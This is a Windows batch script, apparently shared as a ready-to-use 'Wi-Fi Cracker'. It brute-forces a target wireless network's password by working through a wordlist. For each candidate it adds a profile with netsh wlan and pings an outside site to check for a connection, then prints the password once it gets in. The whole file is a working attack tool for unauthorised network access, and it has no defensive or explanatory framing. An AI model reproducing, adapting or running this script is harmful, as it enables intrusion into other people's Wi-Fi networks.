:: Programmed by hXR16F
:: hXR16F.ar@gmail.com

@echo off
setlocal EnableDelayedExpansion
title Wi-Fi Cracker & mode 80,25 & color 07

set "line=1" & set "wordlist_length=0" & set "tried=0" & set "null=" & set "16F=16F"
for /F "tokens=*" %%n in ('type Wi-Fi_Crack_Char.chr') do (
	if !line! EQU 1 set "chr=%%n"
	if !line! EQU 2 set "chr_1=%%n"
	set /A line+=1
)
set "prefix=!chr!" & set "prefix_1=!chr_1!"

set tempvar=1
for /F "tokens=1* delims=" %%i in (input.ini) do (
		if "!tempvar!" EQU "1" set "ssid=%%i"
		if "!tempvar!" EQU "2" set "wordlist=%%i"
		if "!tempvar!" EQU "3" set "speed=%%i"
		if "!tempvar!" EQU "4" set "auth=%%i"
		set /A tempvar+=1
	)
)
del /F /Q input.ini > nul

Wi-Fi_Crack_Close_Window.dll "Wi-Fi Cracker - Networks" >nul 2>&1
if not defined ssid exit
if not defined speed set "speed=3"
if not defined auth set "auth=WPA2PSK"
(
	if "%speed%" EQU "6" echo;65> "Wi-Fi_Crack_Ping_Terminate.ini"
	if "%speed%" EQU "5" echo;120> "Wi-Fi_Crack_Ping_Terminate.ini"
	if "%speed%" EQU "4" echo;250> "Wi-Fi_Crack_Ping_Terminate.ini"
	if "%speed%" EQU "3" echo;600> "Wi-Fi_Crack_Ping_Terminate.ini"
	if "%speed%" EQU "2" echo;1000> "Wi-Fi_Crack_Ping_Terminate.ini"
	if "%speed%" EQU "1" echo;1400> "Wi-Fi_Crack_Ping_Terminate.ini"
)

for /F "delims=" %%n in ('type !wordlist!') do (
	set /A "wordlist_length+=1"
)

title Wi-Fi Cracker - Cracking in progress...
for /F "delims=" %%a in ('type !wordlist!') do (
	set /A "tried+=1"
	cls
	(
		echo.
		echo;  !prefix! Wi-Fi Cracker by hXR!16F!
		echo.
		echo;  !prefix! Selected network : !ssid!
		echo.
		echo;  !prefix! Authentication : !auth!
		echo.
		echo;  !prefix! Wordlist length : !wordlist_length!
		echo.
		echo;    !prefix_1! Tried : !tried!
		echo;    !prefix_1! Trying : %%a
	)
	call Wi-Fi_Crack_XML_Gen.bat "!ssid!" "%%a" "!auth!"
	netsh wlan add profile Wi-Fi_Crack_Profile.xml >nul 2>&1 && (
		if "!speed!" EQU "6" (
			Wi-Fi_Crack_Wait.dll /w 225
		) else (
			if "!speed!" EQU "5" (
				Wi-Fi_Crack_Wait.dll /w 400
			) else (
				if "!speed!" EQU "4" (
					Wi-Fi_Crack_Wait.dll /w 750
				) else (
					if "!speed!" EQU "3" (
						Wi-Fi_Crack_Wait.dll /w 1000
					) else (
						if "!speed!" EQU "2" (
							Wi-Fi_Crack_Wait.dll /w 1500
						) else (
							if "!speed!" EQU "1" (
								Wi-Fi_Crack_Wait.dll /w 2200
							)
						)
					)
				)
			)
		)
		start /MIN Wi-Fi_Crack_Ping_Terminate.bat
		ping www.google.com -n 1 > nul && (
			(
				echo.
				echo;  !prefix! Password : %%a
			)
			title Wi-Fi Cracker - Success
			(
				echo;| set /P "%random%=!null!"> "Wi-Fi_Crack_Profile.xml"
				echo;| set /P "%random%=!null!"> "Wi-Fi_Crack_Ping_Terminate.ini"
			)
			for /L %%n in (0,0,1) do pause > nul
		) || (
			netsh wlan delete profile name="!ssid!" >nul 2>&1
		)
		Wi-Fi_Crack_Close_Window.dll "Wi-Fi Cracker Ping Terminate" >nul 2>&1
	)
)
title Wi-Fi Cracker - Failed
for /L %%n in (0,0,1) do pause > nul
